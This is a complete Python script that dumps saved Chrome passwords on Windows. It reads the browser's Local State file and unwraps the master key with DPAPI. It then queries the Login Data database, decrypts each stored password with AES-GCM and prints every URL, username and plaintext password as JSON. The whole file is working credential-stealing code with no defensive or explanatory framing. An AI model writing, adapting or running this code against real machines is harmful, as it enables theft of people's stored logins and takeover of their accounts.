import os
import sqlite3
import json
import base64
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2
import win32crypt  # Windows-specific; for cross-platform, use alternative

def get_chrome_key():
    # Windows path; adapt for macOS/Linux
    local_state_path = os.path.expanduser(r"~\AppData\Local\Google\Chrome\User Data\Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]  # Remove DPAPI prefix
    return win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]

def decrypt_password(encrypted_password: bytes, key: bytes) -> str:
    if encrypted_password[:3] != b'v10':
        return ""
    iv = encrypted_password[3:15]
    data = encrypted_password[15:]
    cipher = AES.new(key, AES.MODE_GCM, iv)
    return cipher.decrypt(data).decode()

def dump_passwords():
    key = get_chrome_key()
    db_path = os.path.expanduser(r"~\AppData\Local\Google\Chrome\User Data\Default\Login Data")
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    results = []
    for row in cursor.fetchall():
        url, user, encrypted_pass = row
        password = decrypt_password(encrypted_pass, key)
        results.append({"url": url, "user": user, "pass": password})
    conn.close()
    print(json.dumps(results))

if __name__ == "__main__":
    dump_passwords()
